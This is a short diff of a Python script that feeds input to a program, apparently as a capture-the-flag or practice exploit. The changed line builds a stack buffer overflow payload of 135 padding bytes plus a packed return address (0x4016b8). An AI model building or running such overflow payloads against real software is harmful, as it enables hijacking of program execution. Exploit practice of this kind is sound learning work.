@@ -36,4 +36,4 @@ print("pass1234")
 
 print("1")
 print()
-print('A' * 100 + 'BBBBBB')
+print('A' * 135 + '\xb8\x16\x40\x00\x00\x00\x00\x00\x00\x00\x00')
